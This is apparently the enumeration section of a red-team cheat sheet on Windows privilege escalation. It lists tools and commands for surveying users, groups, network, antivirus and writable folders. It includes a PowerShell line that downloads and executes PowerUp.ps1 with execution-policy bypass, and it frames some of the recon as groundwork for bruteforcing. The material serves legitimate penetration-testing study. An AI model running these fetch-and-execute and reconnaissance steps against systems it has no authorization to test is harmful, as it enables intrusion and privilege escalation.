<!-- provenance: InternalAllTheThings docs/redteam/escalation/windows-privilege-escalation.md @ 203bb0c | part 1/5: Windows Privilege Escalation - Enumeration | converted for Agent Skills; see ../../NOTICE.md -->

# Windows - Privilege Escalation

## Summary

* [Tools](#tools)
* [Windows Version and Configuration](#windows-version-and-configuration)
* [User Enumeration](#user-enumeration)
* [Network Enumeration](#network-enumeration)
* [Antivirus Enumeration](#antivirus-enumeration)
* [Default Writable Folders](#default-writable-folders)
* [EoP - Looting for passwords](windows-privesc-credential-looting.md#eop---looting-for-passwords)
    * [SAM and SYSTEM files](windows-privesc-credential-looting.md#sam-and-system-files)
    * [HiveNightmare](windows-privesc-credential-looting.md#hivenightmare)
    * [LAPS Settings](windows-privesc-credential-looting.md#laps-settings)
    * [Search for file contents](windows-privesc-credential-looting.md#search-for-file-contents)
    * [Search for a file with a certain filename](windows-privesc-credential-looting.md#search-for-a-file-with-a-certain-filename)
    * [Search the registry for key names and passwords](windows-privesc-credential-looting.md#search-the-registry-for-key-names-and-passwords)
    * [Passwords in unattend.xml](windows-privesc-credential-looting.md#passwords-in-unattendxml)
    * [Wifi passwords](windows-privesc-credential-looting.md#wifi-passwords)
    * [Sticky Notes passwords](windows-privesc-credential-looting.md#sticky-notes-passwords)
    * [Passwords stored in services](windows-privesc-credential-looting.md#passwords-stored-in-services)
    * [Passwords stored in Key Manager](windows-privesc-credential-looting.md#passwords-stored-in-key-manager)
    * [Passwords stored in UWP PasswordVault](windows-privesc-credential-looting.md#passwords-stored-in-uwp-passwordvault)
    * [Powershell History](windows-privesc-credential-looting.md#powershell-history)
    * [Powershell Transcript](windows-privesc-credential-looting.md#powershell-transcript)
    * [Password in Alternate Data Stream](windows-privesc-credential-looting.md#password-in-alternate-data-stream)
* [EoP - Processes Enumeration and Tasks](windows-privesc-local-eop.md#eop---processes-enumeration-and-tasks)
* [EoP - Incorrect permissions in services](windows-privesc-local-eop.md#eop---incorrect-permissions-in-services)
* [EoP - Windows Subsystem for Linux (WSL)](windows-privesc-local-eop.md#eop---windows-subsystem-for-linux-wsl)
* [EoP - Unquoted Service Paths](windows-privesc-local-eop.md#eop---unquoted-service-paths)
* [EoP - $PATH Interception](windows-privesc-local-eop.md#eop---path-interception)
* [EoP - Named Pipes](windows-privesc-local-eop.md#eop---named-pipes)
* [EoP - Kernel Exploitation](windows-privesc-local-eop.md#eop---kernel-exploitation)
* [EoP - Microsoft Windows Installer](windows-privesc-local-eop.md#eop---microsoft-windows-installer)
    * [AlwaysInstallElevated](windows-privesc-local-eop.md#alwaysinstallelevated)
    * [CustomActions](windows-privesc-local-eop.md#customactions)
* [EoP - Insecure GUI apps](windows-privesc-local-eop.md#eop---insecure-gui-apps)
* [EoP - Evaluating Vulnerable Drivers](windows-privesc-local-eop.md#eop---evaluating-vulnerable-drivers)
* [EoP - Printers](windows-privesc-local-eop.md#eop---printers)
    * [Universal Printer](windows-privesc-local-eop.md#universal-printer)
    * [Bring Your Own Vulnerability](windows-privesc-local-eop.md#bring-your-own-vulnerability)
* [EoP - Runas](windows-privesc-local-eop.md#eop---runas)
* [EoP - Abusing Shadow Copies](windows-privesc-local-eop.md#eop---abusing-shadow-copies)
* [EoP - From local administrator to NT SYSTEM](windows-privesc-privileges.md#eop---from-local-administrator-to-nt-system)
* [EoP - Living Off The Land Binaries and Scripts](windows-privesc-privileges.md#eop---living-off-the-land-binaries-and-scripts)
* [EoP - Impersonation Privileges](windows-privesc-privileges.md#eop---impersonation-privileges)
    * [Restore A Service Account's Privileges](windows-privesc-privileges.md#restore-a-service-accounts-privileges)
    * [Meterpreter getsystem and alternatives](windows-privesc-privileges.md#meterpreter-getsystem-and-alternatives)
    * [RottenPotato (Token Impersonation)](windows-privesc-privileges.md#rottenpotato-token-impersonation)
    * [Juicy Potato (Abusing the golden privileges)](windows-privesc-privileges.md#juicy-potato-abusing-the-golden-privileges)
    * [Rogue Potato (Fake OXID Resolver)](windows-privesc-privileges.md#rogue-potato-fake-oxid-resolver))
    * [EFSPotato (MS-EFSR EfsRpcOpenFileRaw)](windows-privesc-privileges.md#efspotato-ms-efsr-efsrpcopenfileraw))
    * [PrintSpoofer (Printer Bug)](windows-privesc-privileges.md#printspoofer-printer-bug)))
* [EoP - Privileged File Write](windows-privesc-privileges.md#eop---privileged-file-write)
    * [DiagHub](windows-privesc-privileges.md#diaghub)
    * [UsoDLLLoader](windows-privesc-privileges.md#usodllloader)
    * [WerTrigger](windows-privesc-privileges.md#wertrigger)
    * [WerMgr](windows-privesc-privileges.md#wermgr)
* [EoP - Privileged File Delete](windows-privesc-privileges.md#eop---privileged-file-delete)
* [EoP - Common Vulnerabilities and Exposures](windows-privesc-cves.md#eop---common-vulnerabilities-and-exposure)
    * [MS08-067 (NetAPI)](windows-privesc-cves.md#ms08-067-netapi)
    * [MS10-015 (KiTrap0D)](windows-privesc-cves.md#ms10-015-kitrap0d---microsoft-windows-nt200020032008xpvista7)
    * [MS11-080 (adf.sys)](windows-privesc-cves.md#ms11-080-afdsys---microsoft-windows-xp2003)
    * [MS15-051 (Client Copy Image)](windows-privesc-cves.md#ms15-051-client-copy-image---microsoft-windows-20032008782012)
    * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
    * [MS17-010 (Eternal Blue)](windows-privesc-cves.md#ms17-010-eternal-blue)
    * [CVE-2019-1388](windows-privesc-cves.md#cve-2019-1388)
* [EoP - $PATH Interception](windows-privesc-local-eop.md#eop---path-interception)
* [References](windows-privesc-cves.md#references)

## Tools

* [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)

    ```powershell
    powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
    ```

* [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
* [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)

    ```powershell
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
    ```

* [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
* [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

    ```powershell
    ./windows-exploit-suggester.py --update
    ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
    ```

* [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
* [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
* [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
* [Seatbelt - A C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)

    ```powershell
    Seatbelt.exe -group=all -full
    Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
    Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
    ```

* [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
* [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)

    ```powershell
    powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    ```

* [winPEAS - Windows Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
* [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)

    ```powershell
    # First obtain systeminfo
    systeminfo
    systeminfo > systeminfo.txt
    # Then feed it to wesng
    python3 wes.py --update-wes
    python3 wes.py --update
    python3 wes.py systeminfo.txt
    ```

* [PrivescCheck - Privilege Escalation Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)

    ```powershell
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML"
    ```

## Windows Version and Configuration

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

Extract patchs and updates

```powershell
wmic qfe
```

Architecture

```powershell
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

List all env variables

```powershell
set
Get-ChildItem Env: | ft Key,Value
```

List all drives

```powershell
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## User Enumeration

Get current username

```powershell
echo %USERNAME% || whoami
$env:username
```

List user privilege

```powershell
whoami /priv
whoami /groups
```

List all users

```powershell
net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

List logon requirements; useable for bruteforcing

```powershell
$env:usernadsc
net accounts
```

Get details about a user (i.e. administrator, admin, current user)

```powershell
net user administrator
net user admin
net user %USERNAME%
```

List all local groups

```powershell
net localgroup
Get-LocalGroup | ft Name
```

Get details about a group (i.e. administrators)

```powershell
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
```

Get Domain Controllers

```powershell
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName
```

## Network Enumeration

List all network interfaces, IP, and DNS.

```powershell
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

List current routing table

```powershell
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

List the ARP table

```powershell
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

List all current connections

```powershell
netstat -ano
```

List all network shares

```powershell
net share
powershell Find-DomainShare -ComputerDomain domain.local
```

SNMP Configuration

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

## Antivirus Enumeration

Enumerate antivirus on a box with `WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`

## Default Writable Folders

```powershell
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp
```
